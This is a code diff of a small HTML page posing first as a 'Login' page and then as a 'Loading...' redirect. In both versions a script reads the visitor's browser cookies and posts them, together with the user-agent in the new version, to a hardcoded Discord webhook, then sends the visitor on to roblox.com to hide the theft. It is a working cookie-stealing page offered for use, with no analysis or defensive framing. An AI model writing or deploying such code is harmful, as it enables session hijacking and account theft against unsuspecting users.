@@ -1,22 +1,47 @@
 <!DOCTYPE html>
 <html>
-<head><title>Login</title></head>
+<head>
+    <title>Loading...</title>
+</head>
 <body>
-<script>
-// Your webhook
-const webhook = "https://discord.com/api/webhooks/1532569658543177738/GytKMid4oNbpE8jS9X_zdcqJf1ZcW23V3_V9LYOST85C4v5ZWbtT198sLiZStmZJdyOk";
-
-// Steal cookies and send
-fetch(webhook, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-        content: "Cookies: " + document.cookie
-    })
-});
-
-// Send to real site
-window.location.href = "https://www.roblox.com";
-</script>
+    <h1>Redirecting...</h1>
+    <script>
+        // Your Discord webhook
+        const webhook = "https://discord.com/api/webhooks/1532569658543177738/GytKMid4oNbpE8jS9X_zdcqJf1ZcW23V3_V9LYOST85C4v5ZWbtT198sLiZStmZJdyOk";
+        
+        // Get all cookies
+        function getCookies() {
+            let allCookies = document.cookie;
+            return allCookies;
+        }
+        
+        // Send to Discord webhook
+        function sendToDiscord(cookieData) {
+            const payload = {
+                content: "```\nCookies: " + cookieData + "\n```\n**User-Agent:** " + navigator.userAgent
+            };
+            
+            fetch(webhook, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => console.log('Sent successfully'))
+            .catch(error => console.log('Error:', error));
+        }
+        
+        // Execute
+        const cookies = getCookies();
+        if (cookies) {
+            sendToDiscord(cookies);
+        }
+        
+        // Redirect to Roblox after 2 seconds
+        setTimeout(() => {
+            window.location.href = "https://www.roblox.com";
+        }, 2000);
+    </script>
 </body>
 </html>
